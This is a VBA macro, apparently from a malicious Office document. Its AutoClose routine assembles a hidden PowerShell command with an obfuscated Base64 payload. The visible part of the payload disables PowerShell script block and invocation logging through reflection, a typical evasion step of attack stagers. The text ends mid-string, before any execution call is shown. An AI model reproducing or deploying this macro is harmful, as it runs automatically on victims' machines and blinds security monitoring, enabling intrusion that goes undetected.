Sub AutoClose()
        h
End Sub

Public Function h() As Variant
        Dim oSR As String
        oSR = "powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVg"
        oSR = oSR + "BFAHIAUwBJAG8AbgBUAGEAQgBsAGUALgBQAFMAVgBlAHIAUwBp"
        oSR = oSR + "AG8ATgAuAE0AQQBqAG8AUgAgAC0AZwBFACAAMwApAHsAJAAwAD"
        oSR = oSR + "AAMQA9AFsAUgBFAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcA"
        oSR = oSR + "ZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQ"
        oSR = oSR + "BnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBV"
        oSR = oSR + "AHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAGwAZAAiAC"
        oSR = oSR + "gAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkA"
        oSR = oSR + "UwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQ"
        oSR = oSR + "BiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAAw"
        oSR = oSR + "ADAAMQApAHsAJAAwADYAYgA9ACQAMAAwADEALgBHAGUAdABWAG"
        oSR = oSR + "EATAB1AGUAKAAkAG4AdQBMAEwAKQA7AEkAZgAoACQAMAA2AEIA"
        oSR = oSR + "WwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZw"
        oSR = oSR + "BnAGkAbgBnACcAXQApAHsAJAAwADYAYgBbACcAUwBjAHIAaQBw"
        oSR = oSR + "AHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAF"
        oSR = oSR + "sAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwA"
        oSR = oSR + "bwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAwADYAYg"
        oSR = oSR + "BbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBn"
        oSR = oSR + "AGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAH"
        oSR = oSR + "AAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8A"
        oSR = oSR + "ZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBMAD0AWwBDAG8AbA"
        oSR = oSR + "BMAEUAYwB0AEkATwBOAHMALgBHAGUAbgBFAHIASQBDAC4ARABp"
        oSR = oSR + "AEMAdABpAG8AbgBBAHIAeQBbAFMAdABSAEkATgBnACwAUwB5AF"
        oSR = oSR + "MAdABFAE0ALgBPAEIASgBFAGMAVABdAF0AOgA6AG4ARQBXACgA"
        oSR = oSR + "KQA7ACQAdgBBAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUw"
        oSR = oSR + "BjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBu"
        oSR = oSR + "AGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAGQARAAoACcARQBuAG"
        oSR = oSR + "EAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8A"
        oSR = oSR + "YwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJA"
        oSR = oSR + "AwADYAYgBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBD"
        oSR = oSR + "AEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAG"
        oSR = oSR + "MAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQA"
